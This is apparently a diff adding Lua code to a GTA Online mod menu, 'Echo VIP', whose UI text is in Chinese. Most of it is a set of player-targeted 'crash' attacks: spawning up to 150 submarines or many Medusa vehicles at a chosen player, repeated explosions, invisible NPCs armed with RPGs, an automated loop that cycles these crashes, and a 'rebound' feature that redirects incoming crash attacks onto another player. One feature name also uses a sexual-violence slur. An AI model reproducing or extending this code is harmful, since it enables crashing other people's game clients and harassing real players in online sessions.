+                        -- 触发爆炸 - isAudible=true, isInvisible=false
+                        VEHICLE.EXPLODE_VEHICLE(vehicle, true, false)
+                        
+                        -- 添加爆炸效果
+                        if vehPos then
+                            FIRE.ADD_EXPLOSION(vehPos.x, vehPos.y, vehPos.z, 7, 1.0, true, false, 0.0)
+                        end
+                        
+                        -- 给时间让爆炸破坏组件并分离
+                        Script.Yield(100)
+                        
+                        -- 之后冻结位置保持残骸不散开太远
+                        ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
+                    end
+                else
+                    failedCount = failedCount + 1
+                end
+                
+                -- 加快生成，每30ms生成一个
+                Script.Yield(30)
+                
+                -- 每20个显示一次进度
+                if i % 20 == 0 then
+                    GUI.AddToast("美杜莎崩溃", string.format("🐍 已生成 %d/%d 个美杜莎 (成功: %d, 失败: %d)", i, count, successCount, failedCount), 2000, eToastPos.TOP_RIGHT)
+                end
+            end
+            
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehHash)
+            GUI.AddToast("美杜莎崩溃", string.format("💥 美杜莎爆炸完成！共 %d 个 (成功: %d, 失败: %d)，10秒后清理", count, successCount, failedCount), 4000, eToastPos.TOP_RIGHT)
+            
+            -- 保持10秒后清理
+            Script.Yield(10000)
+            
+            GUI.AddToast("美杜莎崩溃", "🧹 开始清理美杜莎军团", 2000, eToastPos.TOP_RIGHT)
+            for _, veh in ipairs(vehicles) do
+                if ENTITY.DOES_ENTITY_EXIST(veh) then
+                    deleteEnt(veh)
+                end
+                Script.Yield(5)
+            end
+            GUI.AddToast("美杜莎崩溃", "✅ 美杜莎军团已消散", 2000, eToastPos.TOP_RIGHT)
+        end)
+    end,
+    true
+)
+
+-- ========== 虎鲸崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("SuperJudgeCrash"),
+    "虎鲸崩溃",
+    eFeatureType.Button,
+    "150辆虎鲸+爆炸，10秒后清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("超级判官打飞机", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then return end
+            
+            local hash_kosatka = Utils.Joaat("kosatka")
+            STREAMING.REQUEST_MODEL(hash_kosatka)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(hash_kosatka) and timeout < 100 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            
+            local vehicles = {}
+            
+            for i = 1, 150 do
+                local forwardDistance = 5.0 + (i % 10) * 3.0
+                local veh = GTA.SpawnVehicleForPlayer(hash_kosatka, playerId, forwardDistance)
+                if veh and veh ~= 0 then table.insert(vehicles, veh) end
+                Script.Yield(50)
+            end
+            
+            local pos = targetPed.Position
+            for i = 1, 20 do
+                FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 7, 1.0, true, false, 0.0, false)
+                Script.Yield(100)
+            end
+            
+            Script.Yield(10000)
+            for _, veh in ipairs(vehicles) do deleteEnt(veh) end
+            
+            GUI.AddToast("超级判官打飞机", "执行完成", 2000)
+        end)
+    end, true
+)
+
+-- ==================== AIO循环崩溃（依赖函数） ====================
+-- 冷饭崩溃（TaoTranslator）
+local function ExecuteTaoTranslatorCrash(playerId)
+    if playerId == -1 then
+        GUI.AddToast("冷饭崩溃", "请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+        return
+    end
+
+    local targetCPed = Players.GetCPed(playerId)
+    if not targetCPed then return end
+
+    Script.QueueJob(function()
+        local modelHash = Utils.Joaat("cs_taostranslator2")
+        local weaponHash = 0xB1CA77B1  -- RPG
+
+        for i = 1, 10 do
+            local currentTarget = Players.GetCPed(playerId)
+            if not currentTarget then break end
+
+            local targetCoords = currentTarget.Position
+            local spawnX = targetCoords.x
+            local spawnY = targetCoords.y
+            local spawnZ = targetCoords.z + 0.1
+
+            local pedHandle = GTA.CreatePed(modelHash, 26, spawnX, spawnY, spawnZ, 0.0, true, false)
+
+            if pedHandle ~= 0 then
+                local targetHandle = GTA.PointerToHandle(currentTarget)
+
+                Natives.InvokeVoid(0x02A0C9720B854BFA, pedHandle, true)
+                Natives.InvokeVoid(0xBF0FD6E56C964FCB, pedHandle, weaponHash, 9999, false, true)
+                Natives.InvokeVoid(0xADF692B254977C0C, pedHandle, weaponHash, true)
+                Natives.InvokeVoid(0xF166E48407BAC484, pedHandle, targetHandle, 0, 0)
+                Script.Yield(50)
+                Natives.InvokeVoid(0x5D6B2D4830A67C62, pedHandle, targetCoords.x, targetCoords.y, targetCoords.z, 1000, weaponHash, 1, 1, 0, 1, 0, 0, 0)
+                Script.Yield(300)
+            else
+                Script.Yield(50)
+            end
+        end
+
+        GUI.AddToast("冷饭崩溃", "执行完成", 2000, eToastPos.BOTTOM_RIGHT)
+    end)
+end
+
+-- 动物崩溃
+local function ExecuteAnimalCrash(playerId)
+    if playerId == -1 then return end
+    local targetPed = Players.GetCPed(playerId)
+    if not targetPed then return end
+    
+    local pos = targetPed.Position
+    local heading = ENTITY.GET_ENTITY_HEADING(GTA.PointerToHandle(targetPed))
+    local forward = ENTITY.GET_ENTITY_FORWARD_VECTOR(GTA.PointerToHandle(targetPed))
+    if not forward then return end
+    
+    local animalHashes = {
+        3753204865, 351016938, 2344268885, 802685111, 1193010354,
+        1318032802, 2374682809, 307287994, 882848737, 2506301981,
+        1015224100, 113504370, 2705875277
+    }
+    
+    local animals = {}
+    for i = 0, 5 do
+        local randomHash = animalHashes[math.random(#animalHashes)]
+        local spawnPos = V3.New(pos.x + forward.x * 3, pos.y + forward.y * 3, pos.z + forward.z * 3)
+        local pedHandle = GTA.CreatePed(randomHash, 26, spawnPos.x, spawnPos.y, spawnPos.z, heading, true, true)
+        if pedHandle ~= 0 then
+            table.insert(animals, pedHandle)
+        end
+    end
+    
+    for _, animal in ipairs(animals) do
+        ENTITY.SET_ENTITY_VISIBLE(animal, false)
+        WEAPON.GIVE_WEAPON_TO_PED(animal, 2481070269, 9999, true, true)
+        TASK.TASK_AIM_GUN_AT_COORD(animal, pos.x, pos.y, pos.z, -1, true)
+        TASK.TASK_SHOOT_AT_COORD(animal, pos.x, pos.y, pos.z, 10000, Utils.Joaat("FIRING_PATTERN_FROM_GROUND"))
+    end
+end
+
+-- 攻击崩溃V2
+local function ExecuteAttackV2Crash(playerId)
+    if playerId == -1 then return end
+    local player_ped = Players.GetCPed(playerId)
+    if not player_ped then return end
+    
+    local target_ped_handle = GTA.PointerToHandle(player_ped)
+    local target_pos = player_ped.Position
+    local spawn_pos = { x = target_pos.x, y = target_pos.y, z = target_pos.z + 0.6 }
+    
+    local function tksk_attack_task(ped_handle, target_ped)
+        Natives.InvokeVoid(0x02A0C9720B854BFA, ped_handle, true)
+        Natives.InvokeVoid(0xBF0FD6E56C964FCB, ped_handle, 0x1B06D571, 9999, false, true)
+        Natives.InvokeVoid(0xADF692B254977C0C, ped_handle, 0x1B06D571, true)
+        Natives.InvokeVoid(0x3EDCB0505123623B, ped_handle, true, 0x1B06D571)
+        Natives.InvokeVoid(0x3C606747B23E497B, ped_handle, true)
+        Natives.InvokeVoid(0x060D6E96F8B8E48D, ped_handle, true)
+        Natives.InvokeVoid(0xF166E48407BAC484, ped_handle, target_ped, 0, 0)
+        Natives.InvokeVoid(0xCC97B29285B1DC3B, ped_handle, 100)
+        Natives.InvokeVoid(0x406137F8EF90EAF5, ped_handle, 100)
+    end
+    
+    for loop = 1, 3 do
+        for i = 0, 2 do
+            local ped = GTA.CreatePed(0xD266D9D6, 26, spawn_pos.x, spawn_pos.y, spawn_pos.z, 0.0, true, false)
+            if ped ~= 0 then
+                Natives.InvokeVoid(0x3882114BDE571AD4, ped, false)
+                Natives.InvokeVoid(0xAD738C3085FE7E11, ped, true, true)
+                tksk_attack_task(ped, target_ped_handle)
+                if i % 2 == 0 then
+                    Natives.InvokeVoid(0xBF0FD6E56C964FCB, ped, 0xAB564B93, 9999, false, true)
+                    Natives.InvokeVoid(0xADF692B254977C0C, ped, 0xAB564B93, true)
+                end
+                local player_group = Natives.InvokeInt(0x810E8431C0614BF9, playerId)
+                Natives.InvokeVoid(0x9F3480FE65DB31B5, ped, player_group, 0x6F0783F5)
+                Natives.InvokeVoid(0xBF25EB89375A37AD, 0x6F0783F5, 0x6F0783F5, 5)
+            end
+            Script.Yield(1)
+        end
+        Script.Yield(1)
+    end
+end
+
+-- ========== AIO循环崩溃 ==========
+local aioLoopRunning = false
+
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("AIOLoopCrash"),
+    "AIO循环崩溃",
+    eFeatureType.Toggle,
+    "单击打开开始循环，单击关闭停止。循环执行冷饭崩溃→动物崩溃→攻击崩溃V2，每5秒自动清理一次实体",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        local isEnabled = f:GetBoolValue()
+        
+        if playerId == -1 then
+            GUI.AddToast("AIO循环崩溃", "❌ 请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT)
+            f:SetBoolValue(false)
+            return
+        end
+        
+        if isEnabled then
+            if aioLoopRunning then
+                GUI.AddToast("AIO循环崩溃", "⚠️ 循环已在运行中", 2000)
+                return
+            end
+            
+            aioLoopRunning = true
+            GUI.AddToast("AIO循环崩溃", "🔄 AIO循环已启动（冷饭→动物→攻击V2，NPC≥90时清理）", 3000, eToastPos.TOP_RIGHT)
+            
+            Script.QueueJob(function()
+                while aioLoopRunning do
+                    local currentPlayerId = f:GetPlayerIndex()
+                    if currentPlayerId == -1 then
+                        GUI.AddToast("AIO循环崩溃", "⚠️ 目标玩家已离开，停止循环", 2000)
+                        aioLoopRunning = false
+                        f:SetBoolValue(false)
+                        break
+                    end
+                    
+                    -- 1. 执行冷饭崩溃
+                    if aioLoopRunning then
+                        GUI.AddToast("AIO循环崩溃", "🍚 执行冷饭崩溃...", 1500, eToastPos.TOP_RIGHT)
+                        ExecuteTaoTranslatorCrash(currentPlayerId)
+                        Script.Yield(2000)
+                    end
+                    
+                    -- 2. 执行动物崩溃
+                    if aioLoopRunning then
+                        GUI.AddToast("AIO循环崩溃", "🐾 执行动物崩溃...", 1500, eToastPos.TOP_RIGHT)
+                        ExecuteAnimalCrash(currentPlayerId)
+                        Script.Yield(2000)
+                    end
+                    
+                    -- 3. 执行攻击崩溃V2
+                    if aioLoopRunning then
+                        GUI.AddToast("AIO循环崩溃", "⚔️ 执行攻击崩溃V2...", 1500, eToastPos.TOP_RIGHT)
+                        ExecuteAttackV2Crash(currentPlayerId)
+                        Script.Yield(2000)
+                    end
+                    
+                    -- NPC数量达到90时清理
+                    local pedCount = PoolMgr.GetCurrentPedCount()
+                    if pedCount >= 90 then
+                        GUI.AddToast("AIO循环崩溃", "🧹 NPC数量达到" .. pedCount .. "，清理实体中...", 1000, eToastPos.TOP_RIGHT)
+                        
+                        local vehCount = PoolMgr.GetCurrentVehicleCount()
+                        for i = 0, vehCount - 1 do
+                            local veh = PoolMgr.GetCVehicle(i)
+                            if veh then
+                                local handle = GTA.PointerToHandle(veh)
+                                if handle ~= 0 and ENTITY.DOES_ENTITY_EXIST(handle) then
+                                    networkRQ(handle)
+                                    deleteEnt(handle)
+                                end
+                            end
+                        end
+                        
+                        for i = 0, pedCount - 1 do
+                            local ped = PoolMgr.GetCPed(i)
+                            if ped then
+                                local handle = GTA.PointerToHandle(ped)
+                                if handle ~= 0 and ENTITY.DOES_ENTITY_EXIST(handle) then
+                                    if not PED.IS_PED_A_PLAYER(handle) then
+                                        networkRQ(handle)
+                                        deleteEnt(handle)
+                                    end
+                                end
+                            end
+                        end
+                        
+                        local objCount = PoolMgr.GetCurrentObjectCount()
+                        for i = 0, objCount - 1 do
+                            local obj = PoolMgr.GetCObject(i)
+                            if obj then
+                                local handle = GTA.PointerToHandle(obj)
+                                if handle ~= 0 and ENTITY.DOES_ENTITY_EXIST(handle) then
+                                    networkRQ(handle)
+                                    deleteEnt(handle)
+                                end
+                            end
+                        end
+                        
+                        GUI.AddToast("AIO循环崩溃", "✅ 清理完成，继续下一轮", 1500, eToastPos.TOP_RIGHT)
+                    end
+                    
+                    Script.Yield(1000)
+                end
+                
+                GUI.AddToast("AIO循环崩溃", "⏹️ 循环已停止", 2000, eToastPos.TOP_RIGHT)
+            end)
+        else
+            if aioLoopRunning then
+                aioLoopRunning = false
+                GUI.AddToast("AIO循环崩溃", "⏹️ 正在停止循环...", 2000, eToastPos.TOP_RIGHT)
+            end
+        end
+    end,
+    true
+)
+
+-- ========== 反弹崩溃（跟踪） ==========
+-- 功能：开启后，将本地玩家坐标覆盖到当前选中玩家的位置，并创建一个相机固定在本地玩家原始位置，
+--       每0.5秒更新目标位置，实现“反弹”伪装效果。关闭时恢复坐标并销毁相机。
+local g_ReboundActive = false
+local g_ReboundTargetId = nil
+local g_ReboundFakePos = nil
+local g_ReboundRealPos = nil
+local g_ReboundCamera = nil
+local g_ReboundLoopRunning = false
+local g_ReboundLoopJob = nil
+local g_ReboundCameraCreated = false
+local g_ReboundLocalPed = nil
+local g_ReboundLastUpdateTime = 0
+local NATIVE_CREATE_CAM = 0xC3981DCE61D9E13F
+local NATIVE_SET_CAM_COORD = 0x4D41783FB745E42E
+local NATIVE_SET_CAM_ROT = 0x85973643155D0B07
+local NATIVE_RENDER_SCRIPT_CAMS = 0x07E5B515DB0636FC
+local NATIVE_DESTROY_CAM = 0x865908C81A2C22E9
+local NATIVE_OVERRIDE_COORDS = 0xA7E30DE9272B6D49
+
+local function Rebound_CreateCameraSafely()
+    if g_ReboundCameraCreated or not g_ReboundRealPos then return end
+    Script.QueueJob(function()
+        g_ReboundCamera = Natives.InvokeInt(NATIVE_CREATE_CAM, "DEFAULT_SCRIPTED_CAMERA", true)
+        if g_ReboundCamera and g_ReboundCamera ~= 0 then
+            Natives.InvokeVoid(NATIVE_SET_CAM_COORD, g_ReboundCamera, g_ReboundRealPos.x, g_ReboundRealPos.y, g_ReboundRealPos.z)
+            local heading = g_ReboundLocalPed.Heading or 0
+            Natives.InvokeVoid(NATIVE_SET_CAM_ROT, g_ReboundCamera, 0, 0, heading, 2)
+            Natives.InvokeVoid(NATIVE_RENDER_SCRIPT_CAMS, true, true, 0, false, false, 0)
+            g_ReboundCameraCreated = true
+            Logger.Log(eLogColor.GREEN, "[反弹]", "脚本相机已创建并启用")
+        else
+            Logger.Log(eLogColor.RED, "[错误]", "创建相机失败")
+        end
+    end)
+end
+
+local function Rebound_Stop()
+    if not g_ReboundActive then return end
+    g_ReboundActive = false
+    g_ReboundLoopRunning = false
+    g_ReboundTargetId = nil
+    if g_ReboundLocalPed and g_ReboundRealPos then
+        g_ReboundLocalPed.Position = g_ReboundRealPos
+    end
+    if g_ReboundCameraCreated then
+        Script.QueueJob(function()
+            Natives.InvokeVoid(NATIVE_RENDER_SCRIPT_CAMS, false, true, 0, false, false, 0)
+            Natives.InvokeVoid(NATIVE_DESTROY_CAM, g_ReboundCamera, false)
+            g_ReboundCameraCreated = false
+            g_ReboundCamera = nil
+        end)
+    end
+    g_ReboundFakePos = nil
+    if g_ReboundLoopJob then
+        g_ReboundLoopJob = nil
+    end
+    Logger.Log(eLogColor.YELLOW, "[反弹]", "已停止")
+end
+
+local function Rebound_Loop()
+    while g_ReboundLoopRunning do
+        if not g_ReboundActive then break end
+
+        local now = Time.GetEpocheMs()
+        if now - g_ReboundLastUpdateTime >= 500 then
+            g_ReboundLastUpdateTime = now
+            if g_ReboundTargetId then
+                local targetPed = Players.GetCPed(g_ReboundTargetId)
+                if targetPed then
+                    local pos = targetPed.Position
+                    if pos then
+                        g_ReboundFakePos = V3.New(pos.x, pos.y, pos.z)
+                    end
+                else
+                    Logger.Log(eLogColor.RED, "[警告]", "目标玩家不存在，停止反弹")
+                    Rebound_Stop()
+                    break
+                end
+            end
+        end
+
+        if g_ReboundFakePos and g_ReboundLocalPed then
+            g_ReboundLocalPed.Position = g_ReboundFakePos
+            Natives.InvokeVoid(NATIVE_OVERRIDE_COORDS, g_ReboundLocalPed, g_ReboundFakePos.x, g_ReboundFakePos.y, g_ReboundFakePos.z, 0)
+            if g_ReboundCameraCreated and g_ReboundCamera then
+                Script.QueueJob(function()
+                    Natives.InvokeVoid(NATIVE_SET_CAM_COORD, g_ReboundCamera, g_ReboundRealPos.x, g_ReboundRealPos.y, g_ReboundRealPos.z)
+                end)
+            end
+        end
+
+        Script.Yield(50)
+    end
+end
+
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("ReboundCrash"),
+    "反弹崩溃(影响正常游戏 对玩家列表选中玩家执行)",
+    eFeatureType.Toggle,
+    "在被持续崩溃时使用 如果对面的科技硬防护不行 崩你会自崩",
+    function(f)
+        local enabled = f:GetBoolValue()
+        if enabled then
+            if g_ReboundActive then
+                Rebound_Stop()
+            end
+            local playerId = Utils.GetSelectedPlayer()
+            if not playerId or playerId < 0 or playerId > 31 then
+                GUI.AddToast("反弹崩溃", "❌ 未选中有效玩家", 2000, eToastPos.BOTTOM_RIGHT)
+                f:SetBoolValue(false)
+                return
+            end
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then
+                GUI.AddToast("反弹崩溃", "❌ 无法获取目标玩家实体", 2000, eToastPos.BOTTOM_RIGHT)
+                f:SetBoolValue(false)
+                return
+            end
+            g_ReboundFakePos = V3.New(targetPed.Position.x, targetPed.Position.y, targetPed.Position.z)
+            g_ReboundLocalPed = GTA.GetLocalPed()
+            if not g_ReboundLocalPed then
+                GUI.AddToast("反弹崩溃", "❌ 无法获取本地玩家", 2000, eToastPos.BOTTOM_RIGHT)
+                f:SetBoolValue(false)
+                return
+            end
+            g_ReboundRealPos = V3.New(g_ReboundLocalPed.Position.x, g_ReboundLocalPed.Position.y, g_ReboundLocalPed.Position.z)
+            g_ReboundActive = true
+            g_ReboundTargetId = playerId
+            g_ReboundLastUpdateTime = Time.GetEpocheMs()
+            Logger.Log(eLogColor.GREEN, "[反弹]", string.format("已开始，跟踪玩家 %d 初始位置 (%.2f, %.2f, %.2f)", playerId, g_ReboundFakePos.x, g_ReboundFakePos.y, g_ReboundFakePos.z))
+            Rebound_CreateCameraSafely()
+            g_ReboundLoopRunning = true
+            g_ReboundLoopJob = Script.QueueJob(Rebound_Loop)
+        else
+            Rebound_Stop()
+        end
+    end,
+    true
+)
+
+-- ========== UI绘制 ==========
+-- 玩家标签页（原有功能 + AIO循环崩溃）
+ClickGUI.AddPlayerTab("Echo VIP 崩溃", function()
+    local sel = Utils.GetSelectedPlayer()
+    if ClickGUI.BeginCustomChildWindow("崩溃功能") then
+        ClickGUI.RenderFeature(Utils.Joaat("FragmentCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("FragmentCrashV2"), sel)   -- 新增碎片崩溃V2
+        ClickGUI.RenderFeature(Utils.Joaat("SyncTreeCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("CargoplaneCrash5s"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("PilotCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("DeluxoCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("RocketCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("WealthCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("ColdRiceCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("EchoOmCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("CarLightCrashV2"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("AttackCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("HolyJudgmentV1"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("HolyJudgmentV2"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("EchoOmCrashV2"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("TugCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("TrailerCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("自行车崩溃"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("无效ped"), sel)
+        ClickGUI.RenderFeature(0xA1B2C3D4, sel)
+        ClickGUI.RenderFeature(Utils.Joaat("RapeCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("AvengerCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("MedusaCrash"), sel)
+        ClickGUI.RenderFeature(Utils.Joaat("AIOLoopCrash"), sel)  -- 新增AIO循环崩溃
+        ClickGUI.RenderFeature(Utils.Joaat("SuperJudgeCrash"), sel)
+        ClickGUI.EndCustomChildWindow()
+    end
+end)
+
+-- 全局标签页（放置反弹崩溃等全局功能）
+ClickGUI.AddTab("Echo VIP 全局", function()
+    if ClickGUI.BeginCustomChildWindow("全局崩溃") then
+        ClickGUI.RenderFeature(Utils.Joaat("ReboundCrash"), 0)   -- 反弹崩溃
+        -- 可以继续添加其他全局功能，例如载具节流等
+        ClickGUI.EndCustomChildWindow()
+    end
+end)
+
+-- ===========================================================================
+-- 战局信息显示窗口 (ImGui)
+-- ===========================================================================
+
+local function getSessionHostByNative()
+    local hostId = NETWORK.NETWORK_GET_HOST_PLAYER_INDEX()
+    if hostId ~= -1 then
+        local name = NETWORK.NETWORK_PLAYER_GET_NAME(hostId)
+        if name and name ~= "" then return name end
+    end
+    return "未知"
+end
+
+local function getScriptHostByNative()
+    local scriptHostId = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("freemode", -1, 0)
+    if scriptHostId ~= -1 then
+        local name = NETWORK.NETWORK_PLAYER_GET_NAME(scriptHostId)
+        if name and name ~= "" then return name end
+    end
+    return "未知"
+end
+
+local function getPlayerCount()
+    return NETWORK.NETWORK_GET_NUM_CONNECTED_PLAYERS()
+end
+
+local function getEntityCounts()
+    local vehicleCount = PoolMgr.GetCurrentVehicleCount() or 0
+    local pedCount = PoolMgr.GetCurrentPedCount() or 0
+    local objectCount = PoolMgr.GetCurrentObjectCount() or 0
+    return vehicleCount, pedCount, objectCount
+end
+
+local function getRainbowColor(offset)
+    local time = Time.GetEpocheMs() / 1000
+    local r = math.sin(time * 2 + offset) * 0.5 + 0.5
+    local g = math.sin(time * 2 + offset + 2.094) * 0.5 + 0.5
+    local b = math.sin(time * 2 + offset + 4.188) * 0.5 + 0.5
+    return r, g, b
+end
+
+local function getGradientColor(offset)
+    local time = Time.GetEpocheMs() / 1000
+    local r = math.sin(time * 1.5 + offset) * 0.3 + 0.4
+    local g = math.sin(time * 1.5 + offset + 1.0) * 0.2 + 0.3
+    local b = math.sin(time * 1.5 + offset + 2.0) * 0.3 + 0.7
+    return r, g, b
+end
+
+local particles = {}
+local PARTICLE_COUNT = 20
+local FALL_SPEED = 0.5
+local UPDATE_INTERVAL = 1/60 * 1000
+
+for i = 1, PARTICLE_COUNT do
+    table.insert(particles, {
+        x = math.random(), y = math.random(),
+        vx = (math.random() - 0.5) * 0.1,
+        vy = FALL_SPEED * (0.8 + math.random() * 0.4),
+    })
+end
+
+local accumulator = 0
+local lastTimeMs = Time.GetEpocheMs()
+
+local function updateParticles()
+    local nowMs = Time.GetEpocheMs()
+    local dt = math.min(nowMs - lastTimeMs, 200)
+    lastTimeMs = nowMs
+    accumulator = accumulator + dt
+
+    while accumulator >= UPDATE_INTERVAL do
+        for _, p in ipairs(particles) do
+            p.x = p.x + p.vx * (UPDATE_INTERVAL / 1000)
+            p.y = p.y + p.vy * (UPDATE_INTERVAL / 1000)
+
+            if p.y > 1.0 then
+                p.y = 0.0
+                p.x = math.random()
+            end
+
+            if p.x < 0 then p.x = 0; p.vx = -p.vx end
+            if p.x > 1 then p.x = 1; p.vx = -p.vx end
+        end
+        accumulator = accumulator - UPDATE_INTERVAL
+    end
+end
+
+local function drawWindow()
+    updateParticles()
+
+    ImGui.SetNextWindowBgAlpha(0.85)
+    ImGui.SetNextWindowPos(100, 100, ImGuiCond.FirstUseEver)
+    ImGui.SetNextWindowSize(300, 280, ImGuiCond.FirstUseEver)
+
+    if ImGui.Begin("Echo VIP 战局信息", true, ImGuiWindowFlags.NoCollapse) then
+        local r1, g1, b1 = getRainbowColor(0)
+        ImGui.TextColored(r1, g1, b1, 1.0, "=== Echo-VIP 公益脚本 ===")
+        ImGui.TextColored(r1, g1, b1, 1.0, "     --- 作者 Z ---")
+        ImGui.Separator()
+
+        local r2, g2, b2 = getGradientColor(0)
+        ImGui.TextColored(r2, g2, b2, 1.0, "[ 战局信息 ]")
+        ImGui.Text("战局主机: " .. getSessionHostByNative())
+        ImGui.Text("脚本主机: " .. getScriptHostByNative())
+        ImGui.Text("玩家数量: " .. getPlayerCount())
+
+        ImGui.Spacing()
+
+        local r3, g3, b3 = getGradientColor(2)
+        ImGui.TextColored(r3, g3, b3, 1.0, "[ 实体池 ]")
+        local vehicleCount, pedCount, objectCount = getEntityCounts()
+        ImGui.Text("载具数量: " .. vehicleCount)
+        ImGui.Text("人物数量: " .. pedCount)
+        ImGui.Text("物体数量: " .. objectCount)
+
+        ImGui.Spacing()
+        ImGui.Separator()
+
+        local r4, g4, b4 = getRainbowColor(3)
+        ImGui.TextColored(r4, g4, b4, 1.0, "  公益脚本 纯净体验  ")
+    end
+    ImGui.End()
+    
+    -- 绘制 Fear Of SJ 文字（5秒后自动消失，字体放大）
+    if echoOm_drawing then
+        if Time.GetEpocheMs() < echoOm_drawEndTime then
+            local r, g, b = getRainbowColor(0)
+            local alpha = math.sin(Time.GetEpocheMs() / 500) * 0.3 + 0.7
+            
+            HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
+            HUD.ADD_TEXT_COMPONENT_SUBSTRING_WEBSITE("Fear Of SJ")
+            HUD.SET_TEXT_SCALE(7.0, 7.0)  -- 字体放大到7.0
+            HUD.SET_TEXT_FONT(4)
+            HUD.SET_TEXT_COLOUR(math.floor(r * 255), math.floor(g * 255), math.floor(b * 255), math.floor(alpha * 255))
+            HUD.SET_TEXT_WRAP(0.0, 1.0)
+            HUD.SET_TEXT_CENTRE(true)
+            HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5, 0.4, 0)
+        else
+            echoOm_drawing = false
+        end
+    end
+end
+
+EventMgr.RegisterHandler(eLuaEvent.ON_PRESENT, drawWindow)
+
+Logger.LogInfo("[Echo VIP] 脚本已加载")
